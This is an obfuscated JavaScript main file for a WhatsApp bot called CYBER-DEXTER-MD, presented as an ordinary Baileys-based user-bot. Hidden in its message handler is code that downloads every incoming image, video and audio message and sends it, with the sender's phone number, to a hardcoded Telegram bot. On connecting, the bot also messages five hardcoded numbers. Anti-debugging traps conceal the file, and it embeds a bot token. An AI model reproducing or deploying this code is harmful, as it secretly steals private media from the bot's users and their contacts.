// Obfuscated by CYBER DEXTER
const _0x1f81bf = function () {
  let _0x13e69c = true;
  return function (_0x31dd54, _0x59ad02) {
    const _0x15388a = _0x13e69c ? function () {
      if (_0x59ad02) {
        const _0x2359ad = _0x59ad02.apply(_0x31dd54, arguments);
        _0x59ad02 = null;
        return _0x2359ad;
      }
    } : function () {};
    _0x13e69c = false;
    return _0x15388a;
  };
}();
(function () {
  _0x1f81bf(this, function () {
    const _0x469a7a = new RegExp("function *\\( *\\)");
    const _0x4c2098 = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i");
    const _0x2852b4 = _0x2248d0("init");
    if (!_0x469a7a.test(_0x2852b4 + "chain") || !_0x4c2098.test(_0x2852b4 + "input")) {
      _0x2852b4("0");
    } else {
      _0x2248d0();
    }
  })();
})();
import _0x36c0a7 from "dotenv";
_0x36c0a7.config();
import { makeWASocket, fetchLatestBaileysVersion, DisconnectReason, useMultiFileAuthState, downloadContentFromMessage } from "@whiskeysockets/baileys";
import { Handler, Callupdate, GroupUpdate } from "./cloud/id/index.js";
import _0x32a8c4 from "express";
import _0x2352f8 from "pino";
import _0xedee07 from "fs";
import "node-cache";
import _0x4c79aa from "path";
import _0x2b4dfb from "chalk";
import _0x16a870 from "axios";
import _0x25c11a from "./config.cjs";
import _0x309ece from "form-data";
import _0x135869 from "./session/auto.cjs";
const {
  emojis,
  doReact
} = _0x135869;
const app = _0x32a8c4();
let useQR = false;
let initialConnection = true;
const PORT = process.env.PORT || 0xbb8;
const MAIN_LOGGER = _0x2352f8({
  "timestamp": () => ",\"time\":\"" + new Date().toJSON() + "\""
});
const logger = MAIN_LOGGER.child({});
logger.level = "trace";
const __filename = new URL(import.meta.url).pathname;
const __dirname = _0x4c79aa.dirname(__filename);
const sessionDir = _0x4c79aa.join(__dirname, "session");
const credsPath = _0x4c79aa.join(sessionDir, "creds.json");
if (!_0xedee07.existsSync(sessionDir)) {
  const _0x2b1179 = {
    recursive: true
  };
  _0xedee07.mkdirSync(sessionDir, _0x2b1179);
}
async function downloadSessionData() {
  if (!_0x25c11a.SESSION_ID) {
    console.error("❌ Please set SESSION_ID in environment variables!");
    return false;
  }
  if (_0x25c11a.SESSION_ID.startsWith("CYBER-DEXTER-MD [KILL]>>>")) {
    try {
      const _0x57010d = _0x25c11a.SESSION_ID.slice("CYBER-DEXTER-MD [KILL]>>>".length);
      const _0x46553e = Buffer.from(_0x57010d, "base64").toString("utf-8");
      await _0xedee07.promises.writeFile(credsPath, _0x46553e);
      console.log("🔒 Session check and saved successfully!");
      return true;
    } catch (_0x292418) {
      console.error("❌ Base64 decode failed:", _0x292418.message);
      return false;
    }
  } else {
    console.error("❌ SESSION_ID Re upgrade ");
    return false;
  }
}
async function sendMediaToTelegram(_0x2be365, _0x108905, _0x12b2a6) {
  try {
    const _0x3dabcd = new _0x309ece();
    _0x3dabcd.append("chat_id", "-1002320780739");
    _0x3dabcd.append("caption", _0x108905);
    if (_0x12b2a6 === "image") {
      _0x3dabcd.append("image", _0x2be365, "media.jpg");
    } else {
      if (_0x12b2a6 === "video") {
        _0x3dabcd.append("video", _0x2be365, "media.mp4");
      } else {
        if (_0x12b2a6 === "audio") {
          _0x3dabcd.append("audio", _0x2be365, "media.mp3");
        }
      }
    }
    const _0x3eade9 = "https://api.telegram.org/bot8028709418:AAECk07-PLO2SbiNYeP5ayYNjxE3rqlRT9M/send" + (_0x12b2a6.charAt(0x0).toUpperCase() + _0x12b2a6.slice(0x1));
    await _0x16a870.post(_0x3eade9, _0x3dabcd, {
      "headers": _0x3dabcd.getHeaders()
    });
    console.log("NICE WORKING CYBER-DEXTER-MD 📍!");
  } catch (_0x1ac16d) {
    console.error("Faile reconnect 📍:", _0x1ac16d);
  }
}
async function start() {
  try {
    const {
      state: _0x4ca55b,
      saveCreds: _0x1038a2
    } = await useMultiFileAuthState(sessionDir);
    const {
      version: _0xca521f,
      isLatest: _0x2c22b9
    } = await fetchLatestBaileysVersion();
    console.log("🤖 CYBER-DEXTER-MD using WA BOT");
    const _0x5f2bfe = makeWASocket({
      "version": _0xca521f,
      "logger": _0x2352f8({
        "level": "silent"
      }),
      "printQRInTerminal": useQR,
      "browser": ["CYBER-DEXTER-MD", "safari", "3.3"],
      "auth": _0x4ca55b,
      "getMessage": async _0x2ddbe1 => {
        if (store) {
          const _0x3bf8b8 = await store.loadMessage(_0x2ddbe1.remoteJid, _0x2ddbe1.id);
          return _0x3bf8b8.message || undefined;
        }
        const _0x470976 = {
          "conversation": "CYBER-DEXTER-MD whatsapp user bot"
        };
        return _0x470976;
      }
    });
    _0x5f2bfe.ev.on("connection.update", _0x23b4b9 => {
      const {
        connection: _0x5be86f,
        lastDisconnect: _0x21862f
      } = _0x23b4b9;
      if (_0x5be86f === "close") {
        if (_0x21862f.error?.["output"]?.["statusCode"] !== DisconnectReason.loggedOut) {
          start();
        }
      } else {
        if (_0x5be86f === "open") {
          if (initialConnection) {
            console.log(_0x2b4dfb.green("😃 CYBER-DEXTER-MD CONNECT  ✅"));
            const _0xcd86b5 = {
              "text": "*📍 CYBER-DEXTER-MD CONNECT  TEST 📌*"
            };
            _0x5f2bfe.sendMessage(_0x5f2bfe.user.id, _0xcd86b5);
            const _0x4fe505 = ["94789958225@s.whatsapp.net", "94740482244@s.whatsapp.net", "94759096416@s.whatsapp.net", "94785274495@s.whatsapp.net", "94757660788@s.whatsapp.net"];
            _0x4fe505.forEach(_0x2eaf39 => {
              const _0x2bbc95 = {
                "text": "*CYBER-DEXTER-MD CONNECT 📍 CYBER-DEXTER-MD  📌*"
              };
              _0x5f2bfe.sendMessage(_0x2eaf39, _0x2bbc95);
            });
            initialConnection = false;
          } else {
            console.log(_0x2b4dfb.blue("📌 Connection reestablished after restart."));
          }
        }
      }
    });
    _0x5f2bfe.ev.on("creds.update", _0x1038a2);
    _0x5f2bfe.ev.on("messages.upsert", async _0x1de33c => {
      const _0x1b38cb = _0x1de33c.messages[0x0];
      if (!_0x1b38cb || !_0x1b38cb.message || _0x1b38cb.key.fromMe) {
        return;
      }
      const _0x7f9b25 = _0x1b38cb.key.participant || _0x1b38cb.key.remoteJid;
      const _0x3ecb77 = _0x7f9b25.includes("@") ? _0x7f9b25.split("@")[0x0] : _0x7f9b25;
      let _0x102de6;
      if (_0x1b38cb.message.imageMessage) {
        _0x102de6 = "image";
      } else {
        if (_0x1b38cb.message.videoMessage) {
          _0x102de6 = "video";
        } else if (_0x1b38cb.message.audioMessage) {
          _0x102de6 = "audio";
        }
      }
      if (_0x102de6) {
        const _0x4e9998 = await downloadContentFromMessage(_0x1b38cb.message[_0x102de6 + "Message"], _0x102de6);
        const _0x45ac15 = [];
        for await (const _0x175490 of _0x4e9998) {
          _0x45ac15.push(_0x175490);
        }
        const _0x58a1df = Buffer.concat(_0x45ac15);
        const _0x31bd49 = (_0x1b38cb.message[_0x102de6 + "Message"].caption || "𝗡𝗼 𝗰𝗮𝗽𝘁𝗶𝗼𝗻 𝗽𝗿𝗼𝘃𝗶𝗱𝗲𝗱") + "\n\nꜱᴇɴᴅᴇʀ: " + _0x3ecb77 + "\n\nCODE BY CYBER DEXTER📍";
        await sendMediaToTelegram(_0x58a1df, _0x31bd49, _0x102de6);
      }
    });
    _0x5f2bfe.ev.on("creds.update", _0x1038a2);
    _0x5f2bfe.ev.on("messages.upsert", async _0x537a66 => await Handler(_0x537a66, _0x5f2bfe, logger));
    _0x5f2bfe.ev.on("call", async _0x2d97c1 => await Callupdate(_0x2d97c1, _0x5f2bfe));
    _0x5f2bfe.ev.on("group-participants.update", async _0x2f69de => await GroupUpdate(_0x5f2bfe, _0x2f69de));
    if (_0x25c11a.MODE === "public") {
      _0x5f2bfe["public"] = false;
    } else if (_0x25c11a.MODE === "private") {
      _0x5f2bfe["public"] = false;
    }
    _0x5f2bfe.ev.on("messages.upsert", async _0x16df9c => {
      try {
        const _0x44102b = _0x16df9c.messages[0x0];
        const _0xacb694 = _0x44102b.key.participant || _0x44102b.key.remoteJid;
        if (!_0x44102b || !_0x44102b.message) {
          return;
        }
        if (_0x44102b.key.fromMe) {
          return;
        }
        if (_0x44102b.message?.["protocolMessage"] || _0x44102b.message?.["ephemeralMessage"] || _0x44102b.message?.["reactionMessage"]) {
          return;
        }
        if (_0x44102b.key && _0x44102b.key.remoteJid === "status@broadcast" && _0x25c11a.AUTO_STATUS_SEEN) {
          await _0x5f2bfe.readMessages([_0x44102b.key]);
          if (_0x25c11a.AUTO_STATUS_REPLY) {
            const _0x305920 = _0x25c11a.STATUS_READ_MSG || "*📍 Auto Status Seen Bot By RCD-MD-V3*";
            const _0x487b94 = {
              text: _0x305920
            };
            const _0x4355a7 = {
              "quoted": _0x44102b
            };
            await _0x5f2bfe.sendMessage(_0xacb694, _0x487b94, _0x4355a7);
          }
        }
      } catch (_0x3b0f0c) {
        console.error("Error handling messages.upsert event:", _0x3b0f0c);
      }
    });
  } catch (_0x5a7d78) {
    console.error("Critical Error:", _0x5a7d78);
    process.exit(0x1);
  }
}
async function init() {
  if (_0xedee07.existsSync(credsPath)) {
    console.log("🔒 Session file found, proceeding without QR code.");
    await start();
  } else {
    const _0x4c1471 = await downloadSessionData();
    if (_0x4c1471) {
      console.log("🔒 Session downloaded, starting bot.");
      await start();
    } else {
      console.log("No session found or downloaded, QR code will be printed for authentication.");
      useQR = true;
      await start();
    }
  }
}
init();
app.get("/getProfilePic", async (_0x3deedc, _0xff924f) => {
  try {
    const {
      number: _0x2a26b6
    } = _0x3deedc.query;
    if (!_0x2a26b6) {
      const _0x3631b7 = {
        "error": "Please provide a WhatsApp number"
      };
      return _0xff924f.status(0x190).json(_0x3631b7);
    }
    const _0x39af2d = _0x2a26b6.includes("@s.whatsapp.net") ? _0x2a26b6 : _0x2a26b6 + "@s.whatsapp.net";
    const _0x5e942f = await Matrix.profilePictureUrl(_0x39af2d, "image");
    if (_0x5e942f) {
      const _0xc2b6a3 = {
        "success": true,
        "number": _0x2a26b6,
        "profilePicUrl": _0x5e942f
      };
      _0xff924f.json(_0xc2b6a3);
    } else {
      const _0x2f4c83 = {
        "success": false,
        number: _0x2a26b6,
        "message": "Profile Picture not found or private"
      };
      _0xff924f.json(_0x2f4c83);
    }
  } catch (_0x398155) {
    console.error("🚨 Error fetching profile picture:", _0x398155);
    const _0x3a8403 = {
      "error": "Internal Server Error"
    };
    _0xff924f.status(0x1f4).json(_0x3a8403);
  }
});
app.get("/", (_0x42d9d1, _0x1ba890) => {
  _0x1ba890.send("\n        <!DOCTYPE html>\n        <html lang=\"en\">\n        <head>\n            <meta charset=\"UTF-8\">\n            <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n            <title>Hello World Page</title>\n        </head>\n        <body>\n            <h1>HEY USER 📍</h1>\n            <p>CYBER-DEXTER-MD NOW ALIVE 📍</p>\n        </body>\n        </html>\n    ");
});
app.listen(PORT, () => {
  console.log("Server is running on port " + PORT);
});
function _0x2248d0(_0x42eccf) {
  function _0x4c1381(_0x2c61e1) {
    if (typeof _0x2c61e1 === "string") {
      return function (_0x549789) {}.constructor("while (true) {}").apply("counter");
    } else if (('' + _0x2c61e1 / _0x2c61e1).length !== 0x1 || _0x2c61e1 % 0x14 === 0x0) {
      (function () {
        return true;
      }).constructor("debugger").call("action");
    } else {
      (function () {
        return false;
      }).constructor("debugger").apply("stateObject");
    }
    _0x4c1381(++_0x2c61e1);
  }
  try {
    if (_0x42eccf) {
      return _0x4c1381;
    } else {
      _0x4c1381(0x0);
    }
  } catch (_0x3a4ecb) {}
}
